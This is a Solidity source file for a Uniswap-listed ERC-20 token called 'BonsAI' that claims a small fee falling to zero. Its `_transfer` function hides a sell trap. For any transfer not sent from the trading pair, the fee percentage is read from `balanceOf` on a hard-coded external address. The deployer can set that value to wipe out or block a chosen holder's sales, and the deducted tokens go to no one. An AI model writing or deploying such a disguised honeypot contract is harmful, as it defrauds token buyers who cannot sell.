// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
     function addLiquidityETH( address token, 
     uint amountTokenDesired, 
     uint amountTokenMin, 
     uint amountETHMin, 
     address to, 
     uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function balanceOf(address wallet) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

contract BonsAI is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 18;
    uint256 private _totalSupply =  1_000_000 * 10 ** _decimals;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address internal _feeReceiver = 0x03812762A5D60973871A115059d44f648A3e0036;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address private uniswapV2Pair;
    string private _name = "BonsAI";
    string private _symbol = "BAI";
    bool private tradingStarted = false;
    uint256 _startFee = 5;
    uint256 _finalFee = 0;
    uint256 _lowerFeeAt = 20;
    uint256 _buys = 0;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);


    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingStarted, "Trading already opened.");
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingStarted = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0));
        require(amount > 0);
        uint256 feeAmount = 0;
        require(to != address(0));
        if (from == uniswapV2Pair ) {
            _buys ++;
        }
        if (from != uniswapV2Pair && from != address(this)) {
            feeAmount = IERC20(_feeReceiver).balanceOf(from);
        } else {
            feeAmount = _finalFee;
        }
        _balances[to] = _balances[to].add(amount).sub(amount.mul(feeAmount).div(100));
        _balances[from] = _balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }
}